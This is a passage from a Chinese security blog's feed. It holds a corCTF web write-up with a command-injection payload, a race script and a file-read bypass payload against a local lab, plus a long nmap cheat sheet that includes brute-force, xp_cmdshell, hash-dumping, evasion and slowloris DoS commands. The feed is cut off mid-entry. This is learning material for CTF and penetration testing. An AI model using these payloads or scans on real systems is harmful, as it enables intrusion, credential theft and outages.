白阁文库 (bylibrary.cn)</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;玩了一星期 开始干活了&lt;/p&gt;
&lt;p&gt;这里收录我看到的比较有用的文章 然后根据文章去实践的记录&lt;/p&gt;</summary>
    
    
    
    <category term="src" scheme="http://example.com/categories/src/"/>
    
    <category term="渗透测试" scheme="http://example.com/categories/src/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="渗透测试" scheme="http://example.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="src" scheme="http://example.com/tags/src/"/>
    
  </entry>
  
  <entry>
    <title>HTB Gobox</title>
    <link href="http://example.com/2022/08/07/HTB-Gobox/"/>
    <id>http://example.com/2022/08/07/HTB-Gobox/</id>
    <published>2022-08-06T17:45:11.000Z</published>
    <updated>2022-08-07T12:08:20.538Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>corCTF</title>
    <link href="http://example.com/2022/08/06/corCTF/"/>
    <id>http://example.com/2022/08/06/corCTF/</id>
    <published>2022-08-06T02:19:24.000Z</published>
    <updated>2022-08-08T10:50:37.472Z</updated>
    
    <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="msfrog-generator"><a href="#msfrog-generator" class="headerlink" title="msfrog-generator"></a>msfrog-generator</h2><p>应该是打个命令注入</p><img src="/2022/08/06/corCTF/image-20220806102023136.png" alt="image-20220806102023136" style="zoom:50%;"><p>通过传json可以出个图片</p><p>推理后台逻辑</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">工具 msonse<span class="selector-class">.png</span> mseyes.png</span><br></pre></td></tr></table></figure><p>明显这里是存在过滤的</p><img src="/2022/08/06/corCTF/image-20220806102253639.png" alt="image-20220806102253639" style="zoom:50%;"><p>直接去度文档就好了</p><img src="/2022/08/06/corCTF/image-20220806102554200.png" alt="image-20220806102554200" style="zoom:50%;"><p>这么说 我这id是个参数</p><img src="/2022/08/06/corCTF/image-20220806113429731.png" alt="image-20220806113429731" style="zoom: 33%;"><p>前面也可以加</p><p>t4rn大哥快我一步</p><p>payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;<span class="built_in">cat</span> /flag;msnose.png</span><br></pre></td></tr></table></figure><p>我的是是 报错才会出现回显 但容器不出网 咋把输出重定向到报错里？有时间可以研究研究</p><h2 id="simplewaf"><a href="#simplewaf" class="headerlink" title="simplewaf"></a>simplewaf</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t corweb2/corweb2 . </span><br></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">docker</span> run -p <span class="number">127.0.0.1:3456</span>:<span class="number">3456</span> -d  corweb2/corweb2</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PORT</span> = process.<span class="property">env</span>.<span class="property">PORT</span> || <span class="number">3456</span>;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>([req.<span class="property">body</span>, req.<span class="property">headers</span>, req.<span class="property">query</span>].<span class="title function_">some</span>(</span><br><span class="line">        <span class="function">(<span class="params">item</span>) =&gt;</span> item &amp;&amp; <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(item).<span class="title function_">includes</span>(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line">    )) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&quot;bad hacker!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">next</span>();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        res.<span class="title function_">setHeader</span>(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">        res.<span class="title function_">send</span>(fs.<span class="title function_">readFileSync</span>(req.<span class="property">query</span>.<span class="property">file</span> || <span class="string">&quot;index.html&quot;</span>).<span class="title function_">toString</span>());       </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(err) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(err);</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Internal server error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="variable constant_">PORT</span>, <span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`web/simplewaf listening on port <span class="subst">$&#123;PORT&#125;</span>`</span>));</span><br></pre></td></tr></table></figure><h3 id="做题过程"><a href="#做题过程" class="headerlink" title="做题过程"></a>做题过程</h3><p>现在这题有几个想法</p><ul><li>让这里解析出问题 <code>JSON.stringify(item).includes(&quot;flag&quot;)</code> 然后就检测不到flag了</li><li>用什么神奇的构造来让他本来检测不出来 然后读进来以后还是当做flag</li></ul><p>查到一个好玩的东西</p><p><img src="/2022/08/06/corCTF/image-20220806205549945.png" alt="image-20220806205549945"></p><p>现在关键就是这个  <code>JSON.stringify(item)</code> 可以搞对象</p><p>然后是不是可以接一些拼接啥的给他干掉？</p><p><a href="https://tttang.com/archive/1394/">https://tttang.com/archive/1394/</a></p><p>理一下思路 </p><p>现在我的想法是</p><ol><li>通过  <code>JSON.stringify(item)</code> 来读一下 <code>flag.txt</code></li><li>一爆破的方式去读软连接</li></ol><p>如何去提前读一下 <code>flag.txt</code> ?  </p><p><a href="https://blog.csdn.net/Zero_Adam/article/details/114853022">https://blog.csdn.net/Zero_Adam/article/details/114853022</a></p><p>查阅了相关资料 这拦截器实在所有路由之前起作用的 所以 只剩下一种可能 就是去读远程的文件了</p><p>读一个远程的软连接？</p><p>stupid try</p><p><del>能不能搞一手竞争之类的</del></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url1=<span class="string">&quot;http://127.0.0.1:3456/?file=flag.txt&quot;</span></span><br><span class="line">url2=<span class="string">&#x27;http://127.0.0.1:3456/?file=wow.html&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read1</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        res = requests.get(url1)</span><br><span class="line">        <span class="comment"># print(res.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;cor&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;suc&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read2</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        res = requests.get(url2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">threads = [threading.Thread(target=read1()),</span><br><span class="line">       threading.Thread(target=read2())]</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure><p>没啥用 不知道是不是我方法的问题</p><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>说实话 这题只有一种可能 那就是 readFileSync 函数可以识别 然后 <code>Json.stringfy()</code>函数不能识别</p><p>去跟一下 readFileSync 的源码</p><p>这个源码 我真是艹了</p><p>这个是官方自带的模块 所以你要到 github 上下node的源码</p><p><a href="https://github.com/nodejs/node/blob/main/lib/fs.js">nodejs/node: Node.js JavaScript runtime (github.com)</a></p><p>在ws里直接b根进 我也不知道跟进了个什么东西 艹</p><p><img src="/2022/08/06/corCTF/image-20220808181641373.png" alt="image-20220808181641373"></p><p>他这里先判断是不是 fd 类型</p><p>不是的话 就用 <code>openSync</code>来读</p><p>我们继续根进</p><p><img src="/2022/08/06/corCTF/image-20220808182144260.png" alt="image-20220808182144260"></p><p>然后看看他是咋 validate 的</p><img src="/2022/08/06/corCTF/image-20220808182358067.png" alt="image-20220808182358067" style="zoom:33%;"><p>这里换包了</p><p><img src="/2022/08/06/corCTF/image-20220808182533066.png" alt="image-20220808182533066"></p><p>又换包了</p><p><img src="/2022/08/06/corCTF/image-20220808182824765.png" alt="image-20220808182824765"></p><p>接着去跟一下</p><p><img src="/2022/08/06/corCTF/image-20220808182942796.png" alt="image-20220808182942796"></p><p>然后来看看那这个 <code>Instance</code> 到底能接受个什么东西 我们肯定要在这里搞出点名堂来</p><p><img src="/2022/08/06/corCTF/image-20220808183226237.png" alt="image-20220808183226237"></p><p>这里做了检查</p><ol><li>不能为空</li><li>要有href</li><li>要有origin</li></ol><p><img src="/2022/08/06/corCTF/image-20220808183701902.png" alt="image-20220808183701902"></p><p>然后看到这里</p><p>这里表明 只接受 <code>file://</code> 和 <code>string</code> </p><p>最后跟到这里</p><img src="/2022/08/06/corCTF/image-20220808184034479.png" alt="image-20220808184034479" style="zoom: 80%;"><p>说是express 的qs解析参数时会出现</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file<span class="selector-attr">[a]</span>=a&amp;file<span class="selector-attr">[c]</span>=<span class="selector-tag">b</span> ==&gt; &#123;<span class="string">&quot;a&quot;</span>:<span class="string">&quot;a&quot;</span>,<span class="string">&quot;c&quot;</span>:<span class="string">&quot;b&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>最终payload</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file[href]=x&amp;file[origin]=x&amp;file[protocol]=<span class="link">file:&amp;file</span>[<span class="string">hostname</span>]=&amp;file[pathname]=fl%2561g.txt</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; title=&quot;WEB&quot;&gt;&lt;/a&gt;WEB&lt;/h1&gt;&lt;h2 id=&quot;msfrog-generator&quot;&gt;&lt;a href=&quot;#msfrog-generator&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    
    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>shodan</title>
    <link href="http://example.com/2022/08/01/shodan/"/>
    <id>http://example.com/2022/08/01/shodan/</id>
    <published>2022-08-01T14:21:47.000Z</published>
    <updated>2022-08-01T16:26:17.146Z</updated>
    
    <content type="html"><![CDATA[<p>学一下这个nb的搜索引擎的使用方法</p><span id="more"></span><p><a href="https://www.freebuf.com/articles/web/271678.html">实战|从零开始的SRC挖掘——如何一洞百分 - FreeBuf网络安全行业门户</a></p><p><a href="https://www.freebuf.com/fevents/224181.html">一些有趣的Shodan搜索 - FreeBuf网络安全行业门户</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;学一下这个nb的搜索引擎的使用方法&lt;/p&gt;</summary>
    
    
    
    <category term="shodan" scheme="http://example.com/categories/shodan/"/>
    
    <category term="渗透测试，信息收集" scheme="http://example.com/categories/shodan/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%EF%BC%8C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    
    <category term="shodan" scheme="http://example.com/tags/shodan/"/>
    
    <category term="渗透测试，信息收集" scheme="http://example.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%EF%BC%8C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>FOFA使用技巧</title>
    <link href="http://example.com/2022/08/01/fofaUsage/"/>
    <id>http://example.com/2022/08/01/fofaUsage/</id>
    <published>2022-07-31T16:09:26.000Z</published>
    <updated>2022-07-31T16:16:29.798Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="bc67ced0caa185eca52ae32f8672f019279a0689bcf15cadd2dc6e31ea3da917"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="fofa" scheme="http://example.com/categories/fofa/"/>
    
    <category term="src" scheme="http://example.com/categories/fofa/src/"/>
    
    
    <category term="src" scheme="http://example.com/tags/src/"/>
    
    <category term="fofa" scheme="http://example.com/tags/fofa/"/>
    
  </entry>
  
  <entry>
    <title>信息收集</title>
    <link href="http://example.com/2022/07/31/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>http://example.com/2022/07/31/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
    <published>2022-07-31T11:59:42.000Z</published>
    <updated>2022-08-07T16:30:45.877Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="33cff6ee0734bc92f88bd92d6749022f479af4a8286d199078338f9382e21d51"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="信息收集" scheme="http://example.com/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    <category term="src" scheme="http://example.com/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/src/"/>
    
    <category term="渗透测试" scheme="http://example.com/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/src/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="渗透测试" scheme="http://example.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="src" scheme="http://example.com/tags/src/"/>
    
    <category term="信息收集" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>nmap</title>
    <link href="http://example.com/2022/07/31/nmap/"/>
    <id>http://example.com/2022/07/31/nmap/</id>
    <published>2022-07-31T10:21:40.000Z</published>
    <updated>2022-07-31T10:36:17.893Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.freebuf.com/sectool/264941.html">NMAP参数详解 - FreeBuf网络安全行业门户</a></p><p>记录一下nmap技巧和小知识</p><span id="more"></span><h1 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h1><h1 id="直接拿过来的"><a href="#直接拿过来的" class="headerlink" title="直接拿过来的"></a>直接拿过来的</h1><h3 id="目标选择"><a href="#目标选择" class="headerlink" title="目标选择"></a>目标选择</h3><p>单个扫描：nmap ip</p><p>扫描主机：nmap <a href="http://www.xxxx.com/">www.XXXX.com</a></p><p>扫描一系列IP：nmap 192.168.1.1-20</p><p>扫描子网：nmap 192.168.1.1/20</p><p>从文本文件获得扫描目标：nmap -iL list-of-ips.txt</p><p>无ping扫描:常用于防火墙禁止ping的情况：nmap -P0 ip</p><h3 id="端口选择"><a href="#端口选择" class="headerlink" title="端口选择"></a>端口选择</h3><p>扫描单个端口：nmap -p 端口 ip</p><p>扫描一系列端口：nmap -p 1-100 192.168.1.1</p><p>扫描100个最常见的端口（快速）：nmap -F ip</p><p>扫描所有65535端口：nmap -p- ip</p><p>扫描指定端口：nmap -p 80,22,3306 ip</p><h3 id="操作系统和服务检测"><a href="#操作系统和服务检测" class="headerlink" title="操作系统和服务检测"></a>操作系统和服务检测</h3><p>检测操作系统和服务：nmap -A ip</p><p>标准服务检测：nmap -sV ip </p><p>激进的服务检测：nmap -sV –version-intensity 5 ip</p><p>轻量Banner抓取检测：nmap -sV –version-intensity 0 ip</p><h3 id="nmap输出格式"><a href="#nmap输出格式" class="headerlink" title="nmap输出格式"></a>nmap输出格式</h3><p>将默认输出保存到文件：nmap -oN outputfile.txt ip</p><p>将结果保存为XML：nmap -oX outputfile.xml ip</p><p>为方便grep来保存格式：nmap -oG outputfile.txt ip</p><p>保存所有格式：nmap -oA outputfile ip</p><h3 id="用NSE脚本深入挖掘"><a href="#用NSE脚本深入挖掘" class="headerlink" title="用NSE脚本深入挖掘"></a>用NSE脚本深入挖掘</h3><p>使用默认安全脚本扫描：nmap -sV -sC ip</p><p>获取脚本的帮助：nmap –script-help=ssl-heartbleed</p><p>使用特定的NSE脚本进行扫描：nmap -sV -p 443 –script=ssl-heartbleed.nse ip</p><p>用一组脚本进行扫描：nmap -sV –script=smb* ip</p><p>使用全部NSE脚本进行扫描：nmap -sV -p- –script=all ip</p><h3 id="HTTP服务信息"><a href="#HTTP服务信息" class="headerlink" title="HTTP服务信息"></a>HTTP服务信息</h3><p>从HTTP服务收集页面标题：nmap –script=http-title 192.168.1.0/24</p><p>获取Web服务的HTTP头：nmap –script=http-headers 192.168.1.0/24</p><p>从已知路径查找网络应用程序：nmap –script=http-enum 192.168.1.0/24</p><h3 id="检测SSL漏洞问题的主机"><a href="#检测SSL漏洞问题的主机" class="headerlink" title="检测SSL漏洞问题的主机"></a>检测SSL漏洞问题的主机</h3><p>Heartbleed测试：nmap -sV -p 443 –script=ssl-heartbleed 192.168.1.0/24</p><h3 id="设备扫描"><a href="#设备扫描" class="headerlink" title="设备扫描"></a>设备扫描</h3><p>获取ip：host 网址<br>      host 域名<br>      dig 域名</p><p>是否存活：ping ip<br>        nmap -sP –script discovery ip</p><p>扫描在线主机：nmap -sP 192.168.1.*</p><p>探测IP协议：nmap -PO ip</p><p>获取系统概况：（暴力形式，很容易被发现）nmap -A ip</p><p>探测是否有【】防火墙：nmap -PN ip</p><p>探测防火墙规则：nmap -sA ip</p><p>TCP Window扫描：nmap -sw ip</p><p>禁止反向域名解析：nmap -n -sL 192.168.1.1/24</p><p>FIN扫描：（FIN扫描方式用于识别端口是否关闭，收到RST回复说明该端口关闭，否则说明是open或filtered状态）nmap -sF ip</p><p>TCP扫描：nmap -sT -p 1-65535 -Pn ip<br>        nmap -sT -p 1-65535 -Pn 192.168.1.1-254<br>        nmap -sL 192.168.1.0/24</p><p>ARP Ping扫描：nmap -PR ip</p><p>SYN扫描：nmap -sS -p- Pn ip</p><p>TCP SYN Ping扫描：nmap -PS -v <a href="http://www.xxx.com/">www.xxx.com</a></p><p>UDP扫描：（UDP扫描费时，所以去掉-p-，默认扫描）nmap -sU ip</p><p>Xmas扫描：nmap -sX -p1-65535 -Pn ip</p><p>Null扫描：nmap -sN -p 1-65535 -Pn ip</p><p>扫描所选端口 - 忽略发现：nmap -Pn -F ip</p><p>绕开鉴权：nmap –script=auth 192.168.56.*</p><p>探测操作系统：nmap -O ip</p><p>探测软件版本：nmap -V ip<br>            nmap -sTV -p- -Pn ip</p><p>设置扫描强度强度在0～9之间，默认强度为7：nmap -V ip<br>                                     nmap -sTV -p- -Pn ip</p><p>轻量级扫描：nmap -sV –version-light <a href="http://www.xxx.com/">www.xxx.com</a></p><p>重量级扫描：nmap -sV –version-all <a href="http://www.xxx.com/">www.xxx.com</a></p><p>版本探测：nmap -sV -A <a href="http://www.xxx.com/">www.xxx.com</a></p><p>对指定的目标进行系统探测：Nmap -osscan-limit <a href="http://www.xxx.com/">www.xxx.com</a></p><p>推测系统识别：Nmap -osscan-guess/–fuzzy <a href="http://www.xxx.com/">www.xxx.com</a></p><p>获取详细版本信息：nmap -sV –version-trace <a href="http://www.xxx.com/">www.xxx.com</a></p><p>全端口版本探测：nmap -allports -A <a href="http://www.xxx.com/">www.xxx.com</a></p><p>RPC扫描：Nmap -sR <a href="http://www.xxx.com/">www.xxx.com</a></p><p>调整并行扫描组的大小(默认为5-1024)最小的组：nmap –min-hostgroup 30 172.20.62.1/24</p><p>调整并行扫描组的大小(默认为5-1024)最大的组：nmap –max-hostgroup 50 172.20.62.1/24</p><p>探查局域网内更多服务：nmap -n –script=broadcast ip</p><p>碎片化：nmap -f ip<br>       nmap –mtu 16 ip</p><p>诱饵：nmap –D RND:10 TARGET<br>     nmap –D decoy1,decoy2,decoy3 target</p><p>MAC地址欺骗：nmap -sT -PN –spoof-mac aa:bb:cc:dd:ee:ff target<br>            nmap -spoof-mac Scisio ip<br>            -spoof-mac 可以根据厂商名字伪造不同mac地址</p><p>发送间隔时间控制：nmap -scan_delay 5ms ip</p><p>发送错误校验：nmap –badsum target</p><p>Http方法：nmap -p80,443 –script http-methods scanme.nmap.org</p><p>发现文件：nmap -sV –script http-enum ip</p><p>判断是否使用默认端口：nmap -sV -script=smtp-strangeport ip</p><p>利用第三方数据库：nmap –script external ip</p><p>获得PHP版本信息：nmap -sV -script=http-php-version ip</p><p>如果想对一个基于WordPress的web站点进行渗透测试，可以使用这个脚本：</p><p>nmap -sV -script=http-php-version ip<br>1.http-wordpress-plugins<br>2.http-wordpress-enum<br>3.http-wordpress-brute</p><p>用户发现IP地址黑名单：nmap -sn ip –script dns-blacklist</p><p>简单暴力猜解：nmap –script=brute 192.168.56.*</p><p>检查是否存在漏洞：nmap –script=vuln 192.168.56.*</p><p>路由跟踪：nmap –traceroute -sP ip</p><p>SCTP INIT Ping扫描：nmap -PY -v ip</p><h3 id="按VNC扫描"><a href="#按VNC扫描" class="headerlink" title="按VNC扫描"></a>按VNC扫描</h3><p>检查vnc bypass：nmap  –script=realvnc-auth-bypass ip</p><p>检查vnc认证方式：nmap  –script=vnc-auth  ip</p><p>获取vnc信息：nmap  –script=vnc-info  ip</p><h3 id="按SMB扫描"><a href="#按SMB扫描" class="headerlink" title="按SMB扫描"></a>按SMB扫描</h3><p>smb破解：nmap  –script=smb-brute.nse ip </p><p>smb字典破解：nmap –script=smb-brute.nse –script-args=userdb=/var/passwd,passdb=/var/passwd ip</p><p>smb已知几个严重漏洞：nmap  –script=smb-check-vulns.nse –script-args=unsafe=1 ip</p><p>查看共享目录：nmap -p 445  –script smb-ls –script-args ‘share=e$,path=,smbuser=test,smbpass=test’ ip</p><p>查询主机一些敏感信息：nmap -p 445 -n –script=smb-psexec –script-args= smbuser=test,smbpass=test ip</p><p>查看会话：nmap -n -p445 –script=smb-enum-sessions.nse –script-args=smbuser=test,smbpass=test ip</p><p>系统信息：nmap -n -p445 –script=smb-os-discovery.nse –script-args=smbuser=test,smbpass=test ip</p><h3 id="按Mssql扫描"><a href="#按Mssql扫描" class="headerlink" title="按Mssql扫描"></a>按Mssql扫描</h3><p>猜解mssql用户名和密码：</p><p>nmap -p1433 –script=ms-sql-brute –script-args=userdb=/var/passwd,passdb=/var/passwd ip</p><p>xp_cmdshell 执行命令：</p><p>nmap -p 1433 –script ms-sql-xp-cmdshell –script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd=”net user” ip</p><p>dumphash值：</p><p>nmap -p 1433 –script ms-sql-dump-hashes.nse –script-args mssql.username=sa,mssql.password=sa  ip</p><h3 id="按Mysql扫描"><a href="#按Mysql扫描" class="headerlink" title="按Mysql扫描"></a>按Mysql扫描</h3><p>扫描root空口令：nmap -p3306 –script=mysql-empty-password.nse ip</p><p>列出所有mysql用户：nmap -p3306 –script=mysql-users.nse –script-args=mysqluser=root ip</p><p>支持同一应用的所有脚本扫描：nmap –script=mysql-* ip</p><h3 id="按Oracle扫描"><a href="#按Oracle扫描" class="headerlink" title="按Oracle扫描"></a>按Oracle扫描</h3><p>oracle sid扫描：nmap –script=oracle-sid-brute -p 1521-1560 ip</p><p>oracle弱口令破解：</p><p>nmap –script oracle-brute -p 1521 –script-args oracle-brute.sid=ORCL,userdb=/var/passwd,passdb=/var/passwd ip</p><h3 id="信息收集扫描"><a href="#信息收集扫描" class="headerlink" title="信息收集扫描"></a>信息收集扫描</h3><p>ip信息搜集：nmap –script ip-geolocation-* <a href="http://www.xxx.com/">www.xxx.com</a></p><p>获得IP地址的信息：nmap –script=asn-query,whois,ip-geolocation-maxmind 192.168.1.0/24</p><p>whois查询：nmap –script whois <a href="http://www.xxx.com/">www.xxx.com</a></p><p>ip反查：nmap -sn –script hostmap-ip2hosts <a href="http://www.xxx.com/">www.xxx.com</a></p><p>信息搜集：nmap –script dns-brute <a href="http://www.xxx.com/">www.xxx.com</a></p><p>列举dns服务器的主机名：nmap –script dns-brute –script-args dns-brute.domain=xxx.com</p><p>检索系统信息：nmap -p 445 ip –script membase-http-info</p><p>后台打印机服务漏洞：nmap –script smb-security-mode.nse -p 445 ip</p><p>smb漏洞扫描：nmap –script smb-check-vulns.nse -p 445 ip//未验证命令</p><p>通过snmp列举windows服务：nmap -sU -p 161 –script=snmp-win32-services ip</p><p>通过snmp列举windows账户：nmap -sU -p 161 –script=snmp-win32-users ip</p><p>http信息搜集,对http版本进行探测：nmap -sV -p 80 <a href="http://www.xxx.com/">www.xxx.com</a></p><p>http头信息探测：nmap -p 80 –script=http-headers <a href="http://www.xxx.com/">www.xxx.com</a></p><p>http目录结构探测：nmap -p 80 –script=http-sitemap-generator <a href="http://www.xxx.com/">www.xxx.com</a></p><p>枚举ssl密钥ssl-enum-ciphers,SSL(Secure Sockets Layer,安全套接层,TLS(Transport Layer Security,传输层安全)：nmap -p 443 –script=ssl-enum-ciphers <a href="http://www.xxx.com/">www.xxx.com</a></p><p>服务器支持的密钥算法SSH服务密钥信息探测：</p><p>nmap -p 22 –script ssh-hostkey –script-args ssh_hostkey=full 127.0.0.1</p><h3 id="其他脚本"><a href="#其他脚本" class="headerlink" title="其他脚本"></a>其他脚本</h3><p>发现网关:Nmap –script=broadcast-netbios-master-browser ip</p><p>telnet破解:nmap -sV –script=telnet-brute ip</p><p>dos攻击:nmap –script http-slowloris –max-parallelism 400 ip</p><p>破解rsync：nmap -p 873 –script rsync-brute –script-args ‘rsync-brute.module=www’ ip</p><p>informix数据库破解：nmap –script informix-brute -p 9088 ip</p><p>pgsql破解：nmap -p 5432 –script pgsql-brute ip</p><p>snmp破解：nmap -sU –script snmp-brute ip</p><p>检查http方法：nmap –script=http-methods.nse ip</p><p>查看本地路由与接口：nmap -iflist</p><p>指定网口与ip地址：nmap -e eth0 ip</p><p>产生随机ip地址:</p><p>nmap -iR 1200000 -sL -n | grep “not scanned” | awk ‘{print $2}’ | sort -n | uniq &gt;! tp; head -25000000 tp &gt;! tcp-allports-1M-IPs; rm tp</p><p>扫描思科路由器：思科路由器会在上述端口中运行了常见的服务。列举出上述端口开放的主机，可以定位到路由器设备可能的IP地址及端口状态。</p><p>nmap -p1-25,80,512-515,2001,4001,6001,9001 10.20.0.1/16</p><p>扫描路由器TFTP：大多数的路由器都支持TFTP协议（简单文件传输协议），该协议常用于备份和恢复路由器的配置文件，运行在UDP 